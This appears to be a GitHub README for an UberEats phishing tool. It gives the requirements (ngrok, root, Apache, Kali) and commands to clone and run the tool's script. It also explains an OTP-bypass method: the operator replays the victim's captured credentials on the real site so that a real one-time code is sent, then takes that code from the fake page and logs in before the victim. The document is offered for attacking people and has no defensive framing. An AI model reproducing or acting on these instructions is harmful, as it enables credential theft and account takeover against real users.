# UberEats-Phishing
This is UberEats-Phishing Tool with Bypass OTP ! UberEats

# OTP Bypass Instructions
When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.

![uber](https://user-images.githubusercontent.com/55870659/76166045-e7e41e00-6131-11ea-9a03-e0cd446aea70.png)

![ub2](https://user-images.githubusercontent.com/55870659/76166048-ef0b2c00-6131-11ea-8494-9e0f72356c0d.png)

# Requirements
1. ngrok setup
2. Root - Must
3. Apache Server
4. Internet
5. add repo on kali

# How to Intsall & Use
root ---must !
1. git clone https://github.com/Ignitetch/UberEats-Phishing.git
2. cd UberEats-Phishing/
3. chmod 777 *
4. ./Uber-eats.sh 

# Contact For Contribute
sg5479845@gmail.com
